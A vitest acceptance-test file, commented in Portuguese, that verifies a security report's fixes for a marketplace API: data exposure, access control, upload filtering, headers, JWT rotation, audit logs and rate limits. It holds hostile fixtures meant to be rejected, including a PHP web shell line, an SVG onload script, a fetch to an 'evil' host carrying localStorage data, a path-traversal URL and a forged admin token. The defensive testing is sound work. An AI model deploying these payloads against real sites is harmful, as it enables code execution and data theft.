// Critérios de aceite da seção 6 do Relatório Técnico 003/2026 (GovTech360),
// reproduzidos contra a aplicação real e o banco de teste. Cada describe leva o
// número do critério e os itens D do relatório que ele comprova.
import { spawnSync } from "child_process";
import fs from "fs";
import jwt from "jsonwebtoken";
import path from "path";
import request from "supertest";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import app from "../src/app";
import { AuditLog, Avaliacao, ImagemProduto } from "../src/entities";
import { CAMPOS_VITRINE } from "../src/serializers/estabelecimento.serializer";
import {
  auth,
  criarEstabelecimento,
  criarUsuario,
  fecharBanco,
  htmlMalicioso,
  jpegReal,
  limparBanco,
  limparUploads,
  pdfFalso,
  pngReal,
  prepararBanco,
  resetarMocks,
  tokenAdmin,
} from "./helpers";

beforeAll(prepararBanco);
afterAll(fecharBanco);
beforeEach(async () => {
  await limparBanco();
  limparUploads();
  resetarMocks();
});
afterEach(() => vi.restoreAllMocks());

const CPF = "98765432100";
const esperar = () => new Promise((r) => setTimeout(r, 60));

const cenario = async () => {
  const dono = await criarUsuario({ username: "dono" });
  const est = await criarEstabelecimento(dono.usuario.usuarioId, {
    cpfResponsavel: CPF,
    cnpj: "12345678000190",
    emailEstabelecimento: "contato@loja.com",
    contatoEstabelecimento: "22988887777",
    nomeResponsavel: "Fulano de Tal",
    ccmeiUrl: "uploads-privados/c/n/ccmei.pdf",
  });
  return { dono, est, id: est.estabelecimentoId };
};

const CAMPOS_PROIBIDOS_RELATORIO = ["cpfResponsavel", "cnpj", "emailEstabelecimento", "telefone", "usuarioId", "ccmeiUrl"];

describe("Critério 1: GET /api/estabelecimentos sem credencial (D1, D2)", () => {
  it("resposta sem cpfResponsavel, cnpj, emailEstabelecimento, telefone, usuarioId e ccmeiUrl", async () => {
    const { est } = await cenario();
    const res = await request(app).get("/api/estabelecimentos");
    expect(res.status).toBe(200);
    expect(res.body.length).toBeGreaterThan(0);
    for (const registro of res.body) {
      for (const campo of CAMPOS_PROIBIDOS_RELATORIO) expect(registro).not.toHaveProperty(campo);
      // Só os campos declarados na projeção da vitrine (mais as imagens).
      for (const chave of Object.keys(registro)) expect([...CAMPOS_VITRINE, "produtosImg"]).toContain(chave);
    }
    for (const valor of [CPF, est.cnpj, est.emailEstabelecimento, "Fulano de Tal", "ccmei.pdf"]) {
      expect(res.text).not.toContain(valor);
    }
  });
});

describe("Critério 2: GET /api/estabelecimentos/{id} sem credencial (D1, D3)", () => {
  it("200 apenas com os campos da vitrine pública", async () => {
    const { id, est } = await cenario();
    const res = await request(app).get(`/api/estabelecimentos/${id}`);
    expect(res.status).toBe(200);
    for (const campo of CAMPOS_PROIBIDOS_RELATORIO) expect(res.body).not.toHaveProperty(campo);
    const permitidos = [...CAMPOS_VITRINE, "produtosImg", "avaliacoes", "media"];
    for (const chave of Object.keys(res.body)) expect(permitidos).toContain(chave);
    expect(res.text).not.toContain(CPF);
    expect(res.text).not.toContain(est.cnpj);
  });

  it("registro que não está ativo (ex.: pendente) não é revelado: 404", async () => {
    const dono = await criarUsuario();
    const pendente = await criarEstabelecimento(dono.usuario.usuarioId, { status: "pendente_aprovacao" });
    expect((await request(app).get(`/api/estabelecimentos/${pendente.estabelecimentoId}`)).status).toBe(404);
  });
});

describe("Critério 3: consultar como responsável de outro estabelecimento (D4)", () => {
  it("nunca devolve os dados do registro alheio", async () => {
    const { id } = await cenario();
    const intruso = await criarUsuario({ username: "intruso" });
    await criarEstabelecimento(intruso.usuario.usuarioId, { nomeFantasia: "Do Intruso", cpfResponsavel: "00000000001" });

    // A lista "meus estabelecimentos" só traz os do próprio usuário.
    const minha = await request(app).get("/api/users/profile/estabelecimentos").set(auth(intruso.token));
    expect(minha.status).toBe(200);
    expect(minha.body.map((e: any) => e.nomeFantasia)).toEqual(["Do Intruso"]);
    expect(minha.text).not.toContain(CPF);

    // Pedir alteração do registro alheio: 404 (não confirma que o id existe) e nada muda.
    const alterar = await request(app).put(`/api/users/profile/estabelecimentos/${id}`).set(auth(intruso.token)).send({ descricao: "x" });
    expect(alterar.status).toBe(404);

    // Rota de detalhe com sessão comum devolve só a vitrine; a rota administrativa nega.
    const detalhe = await request(app).get(`/api/estabelecimentos/${id}`).set(auth(intruso.token));
    expect(detalhe.text).not.toContain(CPF);
    expect((await request(app).get(`/api/admin/estabelecimento/${id}`).set(auth(intruso.token))).status).toBe(401);
  });
});

describe("Critério 4: procurar cpfResponsavel em todas as respostas públicas (D1, D2, D8)", () => {
  it("nenhuma resposta acessível sem credencial contém o CPF", async () => {
    const { id, dono } = await cenario();
    await ImagemProduto.create({ url: "uploads/x/p.webp", estabelecimentoId: id } as any);
    const pai = await Avaliacao.create({ nota: 5, comentario: "bom", usuarioId: dono.usuario.usuarioId, estabelecimentoId: id } as any);
    await Avaliacao.create({ nota: null, comentario: "obrigado", usuarioId: dono.usuario.usuarioId, estabelecimentoId: id, parentId: pai.avaliacoesId } as any);

    const rotasPublicas = [
      "/api/estabelecimentos",
      "/api/estabelecimentos/buscar?nome=Negocio",
      "/api/estabelecimentos/buscar?nome=",
      `/api/estabelecimentos/${id}`,
      `/api/avaliacoes/estabelecimento/${id}`,
      "/api/cursos",
    ];
    for (const rota of rotasPublicas) {
      const res = await request(app).get(rota);
      expect(res.status, rota).toBe(200);
      expect(res.text, rota).not.toContain(CPF);
      expect(res.text, rota).not.toMatch(/cpf/i);
      expect(res.text, rota).not.toContain("contato@loja.com");
    }
  });
});

describe("Critério 5: URL do CCMEI de terceiro sem sessão (D5)", () => {
  it("acesso recusado: sem rota pública para o arquivo e rota autenticada exige admin", async () => {
    const { id } = await cenario();
    fs.mkdirSync("uploads-privados/c/n", { recursive: true });
    fs.writeFileSync("uploads-privados/c/n/ccmei.pdf", pdfFalso());

    // Nenhuma URL estática serve a pasta privada, nem com o nome copiado para /uploads.
    for (const url of ["/uploads-privados/c/n/ccmei.pdf", "/uploads/c/n/ccmei.pdf", "/uploads/ccmei.pdf", "/uploads/../uploads-privados/c/n/ccmei.pdf"]) {
      expect((await request(app).get(url)).status, url).toBe(404);
    }

    const intruso = await criarUsuario();
    expect((await request(app).get(`/api/admin/estabelecimento/${id}/ccmei`)).status).toBe(401);
    expect((await request(app).get(`/api/admin/estabelecimento/${id}/ccmei`).set(auth(intruso.token))).status).toBe(401);
    expect((await request(app).get(`/api/admin/estabelecimento/${id}/ccmei`).set(auth(tokenAdmin()))).status).toBe(200);
  });
});

describe("Critério 6: POST /api/files/upload sem token (D9)", () => {
  it("401, sem gravar arquivo no diretório público", async () => {
    const res = await request(app).post("/api/files/upload").attach("file", await pngReal(), "a.png");
    expect(res.status).toBe(401);
    expect(fs.existsSync("uploads") ? fs.readdirSync("uploads") : []).toHaveLength(0);
    expect(fs.readdirSync("uploads-tmp")).toHaveLength(0);
  });
});

describe("Critério 7: upload autenticado de .html, .svg, .js, .php e .exe (D10, D11)", () => {
  const conteudos: [string, () => Buffer][] = [
    ["a.html", htmlMalicioso],
    ["a.svg", () => Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')],
    ["a.js", () => Buffer.from("fetch('https://evil/'+localStorage.user)")],
    ["a.php", () => Buffer.from("<?php system($_GET['c']); ?>")],
    ["a.exe", () => Buffer.from("MZ\x90\x00\x03")],
  ];

  it.each(conteudos)("%s: 415, sem gravar arquivo e sem resíduo em disco", async (nome, corpo) => {
    const { token } = await criarUsuario();
    const res = await request(app).post("/api/files/upload").set(auth(token)).attach("file", corpo(), nome);
    expect(res.status).toBe(415);
    expect(fs.existsSync("uploads") ? fs.readdirSync("uploads") : []).toHaveLength(0);
    expect(fs.readdirSync("uploads-tmp")).toHaveLength(0);
  });

  it("o mesmo conteúdo com extensão de imagem também é recusado (a extensão não é confiada)", async () => {
    const { token } = await criarUsuario();
    for (const [, corpo] of conteudos) {
      const res = await request(app).post("/api/files/upload").set(auth(token)).attach("file", corpo(), "inocente.png");
      expect(res.status).toBe(415);
    }
    expect(fs.readdirSync("uploads-tmp")).toHaveLength(0);
  });

  it("mensagem genérica: não revela a lista de extensões aceitas nem o caminho de armazenamento", async () => {
    const { token } = await criarUsuario();
    const res = await request(app).post("/api/files/upload").set(auth(token)).attach("file", htmlMalicioso(), "a.html");
    expect(res.text).not.toMatch(/jpg|png|webp|uploads|\/tmp|C:\\/i);
  });
});

describe("Critério 8: .png renomeado para .jpg (D11, D12)", () => {
  it("aceito e gravado com a extensão derivada do tipo detectado pelo servidor", async () => {
    const { token } = await criarUsuario();
    const res = await request(app).post("/api/files/upload").set(auth(token)).attach("file", await pngReal(), "foto.jpg");
    expect(res.status).toBe(200);
    expect(res.body.url).toMatch(/^\/uploads\/[0-9a-f-]{36}\.webp$/);
    expect(res.body.url).not.toContain("foto");
    expect(fs.existsSync(path.resolve(res.body.url.slice(1)))).toBe(true);
  });

  it("um JPEG real enviado como .png também é aceito e normalizado", async () => {
    const { token } = await criarUsuario();
    const res = await request(app).post("/api/files/upload").set(auth(token)).attach("file", await jpegReal(), "foto.png");
    expect(res.status).toBe(200);
    expect(res.body.url).toMatch(/\.webp$/);
  });
});

describe("Critérios 9 e 10: arquivos de /uploads/ e seus cabeçalhos (D13, D14)", () => {
  const publicar = (nome: string, conteudo: Buffer | string) => {
    fs.mkdirSync("uploads", { recursive: true });
    fs.writeFileSync(path.join("uploads", nome), conteudo);
  };

  it.each(["legado.html", "legado.svg", "legado.js", "legado.php", "legado.exe", "legado.sh", "legado.py", "legado"])(
    "%s é entregue como download inerte (nenhum JavaScript executa na origem do portal)",
    async (nome) => {
      publicar(nome, "<script>alert(document.domain)</script>");
      const res = await request(app).get(`/uploads/${nome}`);
      expect(res.status).toBe(200);
      expect(res.headers["content-disposition"]).toBe("attachment");
      expect(res.headers["content-type"]).toMatch(/octet-stream|pdf/);
      expect(res.headers["content-type"]).not.toMatch(/html|javascript|svg/);
      expect(res.headers["x-content-type-options"]).toBe("nosniff");
      expect(res.headers["content-security-policy"]).toContain("sandbox");
    },
  );

  it("imagem validada continua exibível, mas também com nosniff e CSP sandbox", async () => {
    const { token } = await criarUsuario();
    const up = await request(app).post("/api/files/upload").set(auth(token)).attach("file", await pngReal(), "a.png");
    const res = await request(app).get(up.body.url);
    expect(res.headers["content-type"]).toBe("image/webp");
    expect(res.headers["x-content-type-options"]).toBe("nosniff");
    expect(res.headers["content-security-policy"]).toContain("sandbox");
    expect(res.headers["content-security-policy"]).toContain("default-src 'none'");
  });

  it("as respostas da API também levam cabeçalhos de segurança (helmet)", async () => {
    const res = await request(app).get("/api/cursos");
    expect(res.headers["content-security-policy"]).toBeDefined();
    expect(res.headers["x-content-type-options"]).toBe("nosniff");
    expect(res.headers["strict-transport-security"]).toBeDefined();
    expect(res.headers["x-powered-by"]).toBeUndefined();
  });
});

describe("Critério 11: inventariar /uploads/ por extensão (D23, D24)", () => {
  const rodarInventario = (...args: string[]) =>
    spawnSync(
      process.execPath,
      [path.resolve(__dirname, "..", "node_modules", "ts-node", "dist", "bin.js"), "--transpile-only", path.resolve(__dirname, "..", "scripts", "inventariar-uploads.ts"), ...args],
      {
        cwd: process.cwd(),
        encoding: "utf8",
        env: { ...process.env, TS_NODE_PROJECT: path.resolve(__dirname, "..", "tsconfig.json"), NODE_PATH: path.resolve(__dirname, "..", "node_modules") },
      },
    );

  it("depois das correções, só imagens validadas: nenhum .html ou .svg", async () => {
    const { token } = await criarUsuario();
    for (const [nome, corpo] of [["a.png", await pngReal()], ["b.jpg", await jpegReal()], ["c.html", htmlMalicioso()], ["d.svg", Buffer.from("<svg/>")]] as [string, Buffer][]) {
      await request(app).post("/api/files/upload").set(auth(token)).attach("file", corpo, nome);
    }
    const extensoes = fs.readdirSync("uploads").map((f) => path.extname(f));
    expect(extensoes).toHaveLength(2);
    expect(extensoes.every((e) => e === ".webp")).toBe(true);

    const saida = rodarInventario();
    expect(saida.status).toBe(0);
    expect(saida.stdout).toContain("Nenhum arquivo suspeito.");
  }, 30000);

  it("o script acha o que sobrou do teste da Iceberg e coloca em quarentena (nada é apagado)", () => {
    fs.mkdirSync("uploads/antigos", { recursive: true });
    fs.writeFileSync("uploads/antigos/poc.html", "<script>1</script>");
    fs.writeFileSync("uploads/poc.svg", "<svg/>");
    fs.writeFileSync("uploads/ok.webp", "x");

    const simulacao = rodarInventario();
    expect(simulacao.stdout).toMatch(/\.html\s+1\s+<-- SUSPEITA/);
    expect(simulacao.stdout).toMatch(/\.svg\s+1\s+<-- SUSPEITA/);
    expect(fs.existsSync("uploads/poc.svg")).toBe(true); // simulação não move nada

    const real = rodarInventario("--quarentena");
    expect(real.status).toBe(0);
    expect(fs.existsSync("uploads/poc.svg")).toBe(false);
    expect(fs.existsSync("uploads/antigos/poc.html")).toBe(false);
    expect(fs.existsSync("uploads-quarentena/poc.svg")).toBe(true);
    expect(fs.existsSync("uploads-quarentena/antigos/poc.html")).toBe(true);
    expect(fs.existsSync("uploads/ok.webp")).toBe(true);
  }, 30000);
});

describe("Critério 12: armazenamento do token após o login (D19)", () => {
  it("token só em cookie httpOnly; o corpo da resposta não o contém", async () => {
    const { usuario, senha } = await criarUsuario({ username: "ana" });
    const res = await request(app).post("/api/auth/login").send({ username: "ana", password: senha });
    const cookies = res.headers["set-cookie"] as unknown as string[];
    const acesso = cookies.find((c) => c.startsWith("access_token="))!;
    const valor = acesso.split(";")[0].split("=")[1];
    expect(acesso).toMatch(/HttpOnly/i);
    expect(acesso).toMatch(/SameSite=Lax/i);
    expect(valor.split(".")).toHaveLength(3); // é um JWT
    expect(res.text).not.toContain(valor);
    expect(res.body.token).toBeUndefined();
    void usuario;
  });

  it("o login do administrador segue a mesma regra", async () => {
    const res = await request(app).post("/api/admin/login").send({ username: "admin-teste", password: "senha-teste" });
    const cookie = (res.headers["set-cookie"] as unknown as string[]).find((c) => c.startsWith("admin_token="))!;
    expect(cookie).toMatch(/HttpOnly/i);
    expect(res.text).not.toContain(cookie.split(";")[0].split("=")[1]);
  });

  it("Secure ativo em produção", async () => {
    process.env.NODE_ENV = "production";
    try {
      const { usuario, senha } = await criarUsuario();
      const res = await request(app).post("/api/auth/login").send({ username: usuario.username, password: senha });
      expect((res.headers["set-cookie"] as unknown as string[]).every((c) => /Secure/i.test(c))).toBe(true);
    } finally {
      process.env.NODE_ENV = "test";
    }
  });
});

describe("Critério 13: reutilizar o token capturado na prova de conceito (D22)", () => {
  it("rejeitado depois da rotação do segredo de assinatura", async () => {
    const { usuario } = await criarUsuario();
    const capturado = jwt.sign({ id: usuario.usuarioId, username: usuario.username }, process.env.JWT_SECRET as string, { expiresIn: "1h" });
    expect((await request(app).get("/api/users/profile/estabelecimentos").set(auth(capturado))).status).toBe(200);

    const segredoAntigo = process.env.JWT_SECRET;
    process.env.JWT_SECRET = "segredo-novo-depois-da-rotacao";
    try {
      expect((await request(app).get("/api/users/profile/estabelecimentos").set(auth(capturado))).status).toBe(401);
      // Cookie com o mesmo token também.
      expect((await request(app).get("/api/users/profile/estabelecimentos").set("Cookie", `access_token=${capturado}`)).status).toBe(401);
      // E ele não pode ser trocado por uma sessão nova.
      expect((await request(app).post("/api/auth/migrar-sessao").set(auth(capturado))).status).toBe(401);
    } finally {
      process.env.JWT_SECRET = segredoAntigo;
    }
  });

  it("vale também para o token de administrador", async () => {
    const capturado = tokenAdmin();
    expect((await request(app).get("/api/admin/pending").set(auth(capturado))).status).toBe(200);
    const antigo = process.env.ADMIN_JWT_SECRET;
    process.env.ADMIN_JWT_SECRET = "segredo-admin-novo";
    try {
      expect((await request(app).get("/api/admin/pending").set(auth(capturado))).status).toBe(401);
    } finally {
      process.env.ADMIN_JWT_SECRET = antigo;
    }
  });

  it("e o segredo de usuário não assina token de admin (segredos separados)", async () => {
    const forjado = jwt.sign({ username: "x", role: "admin" }, process.env.JWT_SECRET as string);
    expect((await request(app).get("/api/admin/pending").set(auth(forjado))).status).toBe(401);
  });
});

describe("Critério 14: logs de auditoria após consulta a dado pessoal (D6)", () => {
  it("registra usuário (ator), registro consultado e timestamp", async () => {
    const { id, dono } = await cenario();
    const admin = auth(tokenAdmin());
    fs.mkdirSync("uploads-privados/c/n", { recursive: true });
    fs.writeFileSync("uploads-privados/c/n/ccmei.pdf", pdfFalso());

    await request(app).get(`/api/admin/estabelecimento/${id}`).set(admin);
    await request(app).get(`/api/admin/estabelecimento/${id}/ccmei`).set(admin);
    await request(app).get("/api/admin/pending").set(admin);
    await request(app).get("/api/admin/estabelecimentos-ativos").set(admin);
    await request(app).get("/api/admin/exportar-estabelecimentos").set(admin);
    await request(app).get("/api/admin/users").set(admin);
    await request(app).get(`/api/admin/users/${dono.usuario.usuarioId}/interacoes`).set(admin);
    await esperar();

    const logs = await AuditLog.findAll({ order: [["id", "ASC"]] });
    const acoes = logs.map((l) => l.acao);
    for (const acao of [
      "consultar_estabelecimento", "baixar_ccmei", "listar_pendentes", "listar_estabelecimentos_ativos",
      "exportar_estabelecimentos", "listar_usuarios", "consultar_interacoes_usuario",
    ]) expect(acoes, acao).toContain(acao);

    const ccmei = logs.find((l) => l.acao === "baixar_ccmei")!;
    expect(ccmei.ator).toBe("admin-teste");
    expect(ccmei.recurso).toBe(String(id));
    expect(ccmei.ip).toBeTruthy();
    expect(Math.abs(new Date((ccmei as any).createdAt).getTime() - Date.now())).toBeLessThan(60_000);
  });

  it("consulta recusada (sem credencial) não gera registro de acesso", async () => {
    const { id } = await cenario();
    await request(app).get(`/api/admin/estabelecimento/${id}/ccmei`);
    await esperar();
    expect(await AuditLog.count()).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// D8: catálogo de endpoints. Toda rota da API ou exige credencial ou está nesta
// lista de rotas públicas, com o motivo. Rota nova sem autenticação quebra o teste.
// ---------------------------------------------------------------------------
describe("D8: revisão do catálogo de endpoints", () => {
  const PUBLICAS: Record<string, string> = {
    "GET /api/estabelecimentos": "vitrine (sem dado pessoal)",
    "GET /api/estabelecimentos/buscar": "vitrine (sem dado pessoal)",
    "GET /api/estabelecimentos/:id": "vitrine (sem dado pessoal)",
    "POST /api/estabelecimentos/visualizacao/:identificador": "contador de visualizações",
    "GET /api/avaliacoes/estabelecimento/:id": "avaliações públicas (sem e-mail/CPF)",
    "GET /api/cursos": "lista pública de cursos",
    "POST /api/auth/cadastro": "cadastro de usuário",
    "POST /api/auth/login": "login",
    "POST /api/auth/refresh": "renovação (exige cookie de renovação válido)",
    "POST /api/auth/logout": "encerrar sessão (idempotente)",
    "POST /api/auth/resend-confirmation": "reenvio de confirmação (resposta uniforme)",
    "POST /api/auth/forgot-password": "recuperação de senha (resposta uniforme)",
    "POST /api/auth/reset-password": "exige token de uso único",
    "GET /api/auth/confirm-account": "exige token de uso único",
    "GET /api/auth/confirm-email-change": "exige token de uso único",
    "POST /api/admin/login": "login do admin",
    "POST /api/admin/logout": "encerrar sessão do admin (idempotente)",
  };

  const MONTAGENS: Record<string, () => Promise<any>> = {
    "/api/auth": async () => (await import("../src/routes/auth.routes")).default,
    "/api/estabelecimentos": async () => (await import("../src/routes/estabelecimento.routes")).default,
    "/api/avaliacoes": async () => (await import("../src/routes/avaliacao.routes")).default,
    "/api/files": async () => (await import("../src/routes/file.routes")).default,
    "/api/cursos": async () => (await import("../src/routes/curso.routes")).default,
    "/api/admin": async () => (await import("../src/routes/admin.routes")).default,
    "/api/users": async () => (await import("../src/routes/user.routes")).default,
  };

  const listarRotas = async () => {
    const rotas: { metodo: string; caminho: string }[] = [];
    for (const [prefixo, carregar] of Object.entries(MONTAGENS)) {
      const router = await carregar();
      for (const camada of router.stack) {
        if (!camada.route) continue;
        for (const metodo of Object.keys(camada.route.methods)) {
          if (camada.route.methods[metodo]) rotas.push({ metodo: metodo.toUpperCase(), caminho: (prefixo + camada.route.path).replace(/\/$/, "") });
        }
      }
    }
    return rotas;
  };

  it("todo router montado em app.ts está coberto por esta revisão", () => {
    const fonte = fs.readFileSync(path.resolve(__dirname, "..", "src", "app.ts"), "utf8");
    const montados = [...fonte.matchAll(/app\.use\("(\/api\/[a-z]+)"/g)].map((m) => m[1]).filter((p) => p !== "/api");
    for (const prefixo of montados) expect(Object.keys(MONTAGENS), `router ${prefixo} sem revisão`).toContain(prefixo);
  });

  it("existem rotas suficientes para a varredura ser significativa", async () => {
    expect((await listarRotas()).length).toBeGreaterThanOrEqual(55);
  });

  it("toda rota fora da lista pública recusa requisição sem credencial (401)", async () => {
    const rotas = await listarRotas();
    const falhas: string[] = [];
    for (const { metodo, caminho } of rotas) {
      if (PUBLICAS[`${metodo} ${caminho}`]) continue;
      const url = caminho.replace(/:[A-Za-z]+/g, "1");
      const res = await (request(app) as any)[metodo.toLowerCase()](url);
      if (![401, 403].includes(res.status)) falhas.push(`${metodo} ${caminho} -> ${res.status}`);
    }
    expect(falhas, `Rotas sem autenticação fora da lista pública:\n${falhas.join("\n")}`).toEqual([]);
  });

  it("toda rota de dados de usuário comum recusa token de usuário comum nas rotas de admin", async () => {
    const { token } = await criarUsuario();
    const falhas: string[] = [];
    for (const { metodo, caminho } of await listarRotas()) {
      if (!caminho.startsWith("/api/admin") || PUBLICAS[`${metodo} ${caminho}`]) continue;
      const res = await (request(app) as any)[metodo.toLowerCase()](caminho.replace(/:[A-Za-z]+/g, "1")).set(auth(token));
      if (![401, 403].includes(res.status)) falhas.push(`${metodo} ${caminho} -> ${res.status}`);
    }
    expect(falhas).toEqual([]);
  });

  it("as rotas públicas listadas existem de fato (a lista não envelhece)", async () => {
    const existentes = new Set((await listarRotas()).map((r) => `${r.metodo} ${r.caminho}`));
    for (const publica of Object.keys(PUBLICAS)) expect(existentes, publica).toContain(publica);
  });
});

describe("D7 e D15: limites de taxa reais (por IP e por usuário)", () => {
  const carregar = () => vi.importActual<typeof import("../src/middlewares/rateLimit.middleware")>("../src/middlewares/rateLimit.middleware");

  it("D7: a aplicação limita independentemente da borda (o limite geral está ligado a /api)", () => {
    const fonte = fs.readFileSync(path.resolve(__dirname, "..", "src", "app.ts"), "utf8");
    expect(fonte).toMatch(/app\.use\("\/api", limiteGeral\)/);
  });

  it("D7: login, cadastro e e-mail têm limite restrito por IP", async () => {
    const express = (await import("express")).default;
    const { limiteLogin, limiteEmail, limiteCadastro } = await carregar();
    for (const [limite, max] of [[limiteLogin, 10], [limiteEmail, 5], [limiteCadastro, 10]] as const) {
      const mini = express();
      mini.post("/x", limite, (_req, res) => res.json({ ok: true }));
      const status: number[] = [];
      for (let i = 0; i < max + 1; i++) status.push((await request(mini).post("/x")).status);
      expect(status.slice(0, max).every((s) => s === 200)).toBe(true);
      expect(status[max]).toBe(429);
    }
  });

  it("D15: o limite de upload é por usuário: um usuário esgotar não bloqueia outro no mesmo IP", async () => {
    const express = (await import("express")).default;
    const { limiteUploadPorUsuario } = await carregar();
    const mini = express();
    mini.post("/x", (req, _res, next) => {
      (req as any).user = { id: Number(req.headers["x-usuario"]) };
      next();
    }, limiteUploadPorUsuario, (_req, res) => res.json({ ok: true }));

    for (let i = 0; i < 30; i++) expect((await request(mini).post("/x").set("x-usuario", "1")).status).toBe(200);
    expect((await request(mini).post("/x").set("x-usuario", "1")).status).toBe(429);
    expect((await request(mini).post("/x").set("x-usuario", "2")).status).toBe(200);
  });

  it("D15: sem usuário identificado o limite cai para o IP", async () => {
    const express = (await import("express")).default;
    const { limiteUploadPorUsuario } = await carregar();
    const mini = express();
    mini.post("/x", limiteUploadPorUsuario, (_req, res) => res.json({ ok: true }));
    for (let i = 0; i < 30; i++) await request(mini).post("/x");
    expect((await request(mini).post("/x")).status).toBe(429);
  });

  it("D15: toda rota que recebe arquivo tem limite por usuário depois da autenticação", () => {
    const ler = (f: string) => fs.readFileSync(path.resolve(__dirname, "..", "src", "routes", f), "utf8");
    for (const arquivo of ["file.routes.ts", "estabelecimento.routes.ts"]) {
      const fonte = ler(arquivo);
      const blocos = fonte.split(/router\.(?:post|put)\(/).slice(1).filter((b) => b.includes("receberArquivos"));
      expect(blocos.length, arquivo).toBeGreaterThan(0);
      for (const bloco of blocos) {
        const posAuth = bloco.indexOf("authMiddleware");
        const posLimite = bloco.indexOf("limiteUploadPorUsuario");
        expect(posAuth, arquivo).toBeGreaterThan(-1);
        expect(posLimite, arquivo).toBeGreaterThan(posAuth);
        expect(bloco.indexOf("receberArquivos")).toBeGreaterThan(posLimite);
      }
    }
  });

  it("D15: tamanho máximo por arquivo é imposto antes de gravar (413 e sem resíduo)", async () => {
    const { token } = await criarUsuario();
    const res = await request(app).post("/api/files/upload").set(auth(token)).attach("file", Buffer.alloc(11 * 1024 * 1024, 1), "g.jpg");
    expect(res.status).toBe(413);
    expect(fs.readdirSync("uploads-tmp")).toHaveLength(0);
  });
});

describe("D18: monitoramento de uploads", () => {
  it("registra cada envio aceito e cada recusa, com usuário, IP e tipo detectado", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const { usuario, token } = await criarUsuario();
    await request(app).post("/api/files/upload").set(auth(token)).attach("file", await pngReal(), "ok.png");
    await request(app).post("/api/files/upload").set(auth(token)).attach("file", htmlMalicioso(), "mal.html");

    const eventos = log.mock.calls.map((c) => { try { return JSON.parse(String(c[0])); } catch { return null; } }).filter(Boolean);
    const aceito = eventos.find((e) => e.evento === "upload_aceito");
    const recusado = eventos.find((e) => e.evento === "upload_rejeitado");
    expect(aceito).toMatchObject({ usuarioId: usuario.usuarioId, tipo: "png", rota: "/api/files/upload" });
    expect(recusado).toMatchObject({ usuarioId: usuario.usuarioId, extensaoCliente: ".html", tipoDetectado: null });
    expect(aceito.ip).toBeTruthy();
  });
});

describe("D19, D20 e D21: sessão (resumo de aceite)", () => {
  it("acesso de 15 min, renovação de 7 dias, e revogação imediata no servidor", async () => {
    const { usuario, senha } = await criarUsuario();
    const agente = request.agent(app);
    const login = await agente.post("/api/auth/login").send({ username: usuario.username, password: senha });
    const cookies = login.headers["set-cookie"] as unknown as string[];
    expect(cookies.find((c) => c.startsWith("access_token="))).toMatch(/Max-Age=900/);
    expect(cookies.find((c) => c.startsWith("refresh_token="))).toMatch(new RegExp(`Max-Age=${7 * 86400}`));

    expect((await agente.get("/api/users/profile/estabelecimentos")).status).toBe(200);
    await request(app).post(`/api/admin/users/${usuario.usuarioId}/revoke-sessions`).set(auth(tokenAdmin()));
    expect((await agente.get("/api/users/profile/estabelecimentos")).status).toBe(401);
    expect((await agente.post("/api/auth/refresh")).status).toBe(401);
  });
});
